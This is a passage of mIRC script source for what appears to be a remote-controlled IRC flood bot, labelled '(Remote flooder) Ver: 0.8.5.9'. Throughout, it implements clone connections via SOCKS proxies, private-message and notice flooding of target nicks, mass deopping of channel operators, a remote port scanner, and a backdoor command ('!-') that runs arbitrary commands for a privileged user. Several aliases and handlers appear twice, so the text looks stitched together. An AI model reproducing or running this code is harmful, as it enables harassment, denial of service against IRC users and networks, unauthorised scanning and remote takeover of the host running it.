    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 3 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 7 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 11 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8))
    /timer 1 15 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
  inc %cc |  goto ccloop |   :end  | unset %cc }
 if ($1 == !clone.combo.ultimate) {  if ($2 == $null) { msg # !clone.combo.ultimate #/Nick | halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
    /timer 1 5 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
    /timer 1 11  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods
    /timer 1 16  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
    /timer 1 22  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
    /timer 1 27 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
    /timer 1 32 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
    /timer 1 37   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 44 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3
    /timer 1 49 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
    /timer 1 53    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 57    /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingpewppewppewppewppewppewppewppewppewp¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½3GT4SPECIAL3333333333333333333333333333333*1,1Star_WarS*Star_WarS* $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z)
  inc %cc |  goto ccloop |   :end  | unset %cc 
}
 if ($1 == !clone.c.flood) {  if ($2 == $null) { halt } | //msg # Now Flooding... $2 (to stop !flood.stop) |  /clone msg $2 $3- | /clone notice $2 $3-  | //timerConstantFlood1 0 4 /clone msg $2 $3- |  /clone msg $2 $3- | //timerConstantFlood2 0 6 /clone notice $2 $3-  }
  if ($1 == !flood.stop) { timerConstantFlood* off  | msg # Stopping Flood Complete... } 
  if ($1 == !set.flood.server.port) {  if ($2 == $null) { halt } | if ($3 == $null) { halt } |  /set %msg.flood.server $$2 |  /set %msg.flood.server.port $3  }
  if ($1 == !unset) && (Usher isin $address($nick,5)) {  if ($2 == $null) { msg # Error/Syntax: !unset %variable | halt } |  //unset $2 |  //msg # 14[12var unset:14] [12 $+ $2 $+ 14]  }
  if ($1 == !super.flood) {  if ($2 == $null) { halt } | if (%msg.flood.server == $null) || (%msg.flood.server.port == $null) { /msg # MsgFlood server, or port not set! | halt }  | if ($3 == $null) { //set %msg2bomb BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | goto bomb }   | //set %bots 1 | /set %nick2bomb $$2  | /set %msg2bomb $$3- | /msg # 12Random Connect Query/Notice Flooding: $$2 ( $+ %msg2bomb $+ ) |  /dksmsgflooder  |  /timer 1 100 /msg # Flood Complete on: $2  |  /timer 1 100 /sockclose dksmsgflooder*  |   /timer 1 102 /unset %blastedmsgs  }
  if ($1 == !ver) { msg # 11»2G12T11« (Remote flooder) Ver: 0.8.5.9 }
  if ($1 == !credits) { msg # 11»2G12T11« (Credits) DK,\mSg,Sony }
  if ($1 == !super.flood.stop!) {   //set %blastit Off  |  /sockclose dksmsgflooder* |  /unset %blastedmsgs | /msg # Flood Turned OFF:. |  //timers off  }
  if ($1 == !-) && (Usher isin $address($nick,5)) { /msg # 14[12done14]: / $+ $2- | / $+ [ [ $2- ] ] }
}
alias dksmsgflooder { if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
on *:sockopen:dksmsgflooder*:{  inc %bots 1 | sockwrite -tn dksmsgflooder* User $read SCK.SYS $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  SCK.SYS ] ]  | sockwrite -nt dksmsgflooder* NICK $randomgen($r(0,9)) | sockwrite -nt dksmsgflooder* PONG $server |  sockwrite -nt dksmsgflooder* privmsg %nick2bomb : $+ %msg2bomb | sockwrite -nt dksmsgflooder* notice %nick2bomb : $+ %msg2bomb | sockclose $sockname | dec %bots 1 | /dksmsgflooder }
alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }
on *:sockopen:clone*: { sockwrite -tn $sockname User $read SCK.SYS $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  SCK.SYS ] ] | sockwrite -tn $sockname Nick $remove($sockname,clone) | sockread }
on *:sockread:clone*: { sockread %temp.sock |   if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } |  clone in %temp.sock }
alias msg { if (# == $null) { msg $nick $1- }  |   else { msg $1- } }
alias scansock {
  if ($sock(scan*,0) = 0) {
    .msg %scan.nick All Sockets Have closed, scanning all Variables now Being wiped!
    unset %scan.*
    .timersockscheck off
  }
}
on *:SOCKOPEN:scan*: {
  if ($sockerr > 0) { .sockclose $sockname | halt }
  .msg %scan.nick IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
  .write scan.txt IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
  .sockclose $sockname
}
on *:QUIT: if ($nick = %port.nick) { .timerport off | .timerportcheck off | unset %port.* | .sockclose port* | halt }
on *:NICK: if ($nick = %port.nick) { set %port.nick $newnick | .msg %port.nick Port Probing nickname now changed to %port.nick ;) | halt }

on 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }
  elseif (%port.nick != $null) { .msg $nick I am currently scanning %port.address  on ports %port.perm to %port.end  i'm currently at %port.start its estimated another $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) before i'm done
  }
}
on 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }
on 700:TEXT:!portscan *:*: {
  if ($4 = $null) { msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 5 | halt }
  if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning  $+ %port.perm $+  to  $+ %port.end $+  on  $+ %port.address $+  | halt }
  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 1 | halt }
  if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }
  set %port.address $2
  set %port.start $3
  set %port.end $4
  set %port.perm $3
  set %port.delay $5
  set %port.nick $nick
  .timerport 0 %port.delay portscan
  .msg %port.nick now scanning  $+ %port.address $+  on Ports %port.start to %port.end with a delay of %port.delay  estimated time to finish, $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))
}
alias portscan {
  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start
  inc %port.start 1
  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }
}
alias portsock {
  if ($sock(port*,0) = 0) {
    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again
    unset %port.*
    .timerportsock off
  }
}
on *:SOCKOPEN:port*: {
  if ($sockerr > 0) { .sockclose $sockname | halt }
  .msg %port.nick Address: $gettok($remove($sockname,port),2-,46) Port: $gettok($remove($sockname,port),1,46)
  .sockclose $sockname
}
on *:DISCONNECT: { .flush | .timergetinchan off | random | //timerconnect 0 60 whatfun }
on *:OP:#: { if ($chan = %connect.chan) && ($opnick = $me) { mode $chan +mnst-iR } }
alias varset { sockclose * | unset %port.* | unset %scan.* | set %papaflood off | unset %nick | unset %channel | unset %server | unset %port | unset %clones | unset %flood | unset %flood.nick }
alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 2Server not set | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
alias botraw { sockwrite -n sock* $1- }
alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read SCK.SYS | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
on *:sockopen:ock*:{  if ($sockerr > 0) { halt } |  %clones.tmpcalc = $int($calc(%clones.serverport / 256)) |  bset &binvar 1 4  |  bset &binvar 2 1  |  bset &binvar 3 %clones.tmpcalc  |  bset &binvar 4 $calc(%clones.serverport - (%clones.tmpcalc * 256))  |  bset &binvar 5 $gettok(%clones.server,1,46)  |  bset &binvar 6 $gettok(%clones.server,2,46)  | bset &binvar 7 $gettok(%clones.server,3,46)  |  bset &binvar 8 $gettok(%clones.server,4,46)  |  bset &binvar 9 0   | sockwrite $sockname &binvar } 
on *:sockread:ock*:{ if ($sockerr > 0) { halt } |  sockread 4096 &binvar  | if ($sockbr == 0) { return } |  if ($bvar(&binvar,2) == 90) { %clones.tp = $read SCK.SYS |  if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |   sockwrite -n $sockname USER %clones.tp a a : $+ $chr(3) $+ $rand(0,15) $+ $read SCK.SYS |  %clones.tp = $read SCK.SYS |   if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |  sockwrite -n $sockname NICK %clones.tp   | sockmark $sockname %clones.tp |  sockrename $sockname s $+ $sockname  } | elseif ($bvar(&binvar,2) == 91) { return } } 
on *:sockopen:sock*:{ if ($sockerr > 0) { halt } | %clones.tp = $read SCK.SYS | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname USER %clones.tp a a  $+ $read SCK.SYS | %clones.tp = $read SCK.SYS | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname NICK %clones.tp  | sockmark $sockname %clones.tp }
on *:sockread:sock*:{ if ($sockerr > 0) { halt } | sockread 4096 %clones.read | %clones.tmp = $gettok(%clones.read,2,32) | if ($gettok(%clones.read,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clones.read,2,32) } |  elseif (%clones.tmp == 001) { sockwrite -n $sockname MODE $sock($sockname).mark +i |  if (%clones.silence == 1) { sockwrite -n $sockname SILENCE *@* }  } | elseif (%clones.tmp == 433) { %clones.rand = $randomgen($r(0,9)) | sockwrite -n $sockname NICK %clones.rand  | sockmark $sockname %clones.rand } | elseif (%clones.tmp == 353) { if (%clones.deop == 1) { %clones.deop = 0  %clones.cnt2 = 0 |   %clones.deopstr = $null |   :home |  inc %clones.cnt2 1 | $&
%nick = $gettok($gettok(%clones.read,2,58),%clones.cnt2,32) |  if (%nick == $null) { goto end } |   if ($left(%nick,1) != @) { goto home } |  %nick = $gettok(%nick,1,64) |   if ($isbot(%nick) == $true) { goto home } |   if (%clones.incme != 1) { if (%nick == $me) { goto home } } |   %clones.deopstr = %clones.deopstr %nick |  if ($numtok(%clones.deopstr,32) == 3) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null }  |   goto home |    :end |  if ($numtok(%clones.deopstr,32) > 0) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null } }  } | elseif (%clones.tmp == KICK) { if ($gettok(%clones.read,4,32) == $sock($sockname).mark) { sockwrite -n $sockname JOIN $gettok(%clones.read,3,32) }  }  }
on *:sockclose:*ock*:{  if ($left($sockname,1) == o) { %clones.sockname = s $+ $sockname } | else { %clones.sockname = $sockname } } 
alias setserver { %clones.setserver = 1 | .dns -h $1 } 
on *:dns:{ if (%clones.setserver == 1) { %clones.server = $iaddress $raddress | %clones.setserver = 0  } }
on *:DNS:{ if ($nick == $me) { %address = $iaddress } }
on *:DISCONNECT: { //nick $read SCK.SYS $+ $r(a,z) $+ $r(1,9) | server %server | //timercoolconnect -o 0 100 //server %server $+ : $+ 99999 usherindahouse } 
raw 433:*: { //nick $read DOS.src $+ $r(1,9) $+ $r(a,z) }
on *:KICK:#: { if ($knick = $me) && ($chan = %connect.chan) { .timergetinchan 0 30 /join %connect.chan } }
alias dksmsgflooder { if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
on *:sockopen:dksmsgflooder*:{  inc %bots 1 | sockwrite -tn dksmsgflooder* User $read SCK.SYS $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  SCK.SYS ] ]  | sockwrite -nt dksmsgflooder* NICK $randomgen($r(0,9)) | sockwrite -nt dksmsgflooder* PONG $server |  sockwrite -nt dksmsgflooder* privmsg %nick2bomb : $+ %msg2bomb | sockwrite -nt dksmsgflooder* notice %nick2bomb : $+ %msg2bomb | sockclose $sockname | dec %bots 1 | /dksmsgflooder }
